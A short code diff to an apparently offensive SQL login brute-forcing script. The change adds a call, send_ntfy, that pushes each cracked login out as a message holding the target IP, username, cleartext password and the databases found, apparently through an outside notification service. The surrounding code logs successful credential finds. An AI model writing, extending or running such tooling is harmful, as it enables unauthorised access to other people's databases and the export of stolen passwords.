@@ -9,6 +9,7 @@ from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from queue import Queue
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)
@@ -92,6 +93,8 @@ class SQLConnector:
             conn.close()
             logger.info(f"Successfully connected to {adresse_ip} with user {user}")
             logger.info(f"Available databases: {', '.join(databases)}")
+
+
             
             # Sauvegarder les informations avec la liste des bases trouvées
             return True, databases
@@ -121,6 +124,8 @@ class SQLConnector:
                     
                     logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                     logger.success(f"Databases found: {', '.join(databases)}")
+                    message = f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password} | Databases found: {', '.join(databases)} (SQL)"
+                    send_ntfy(message=message)
                     self.save_results()
                     self.remove_duplicates()
                     success_flag[0] = True
